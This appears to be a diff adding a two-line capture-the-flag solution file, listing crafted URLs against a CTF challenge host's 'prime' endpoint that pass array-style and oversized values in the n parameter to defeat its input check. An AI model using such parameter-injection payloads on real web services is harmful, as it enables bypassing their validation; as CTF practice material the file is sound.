@@ -1,0 +1,5 @@
+Solution 1:
+https://gets.sdc.tf/prime?n[]=55555555555555aaaaaaaa555&n[]=1
+
+Solution 2:
+https://gets.sdc.tf/prime?n[]=555555555555555555555555555555
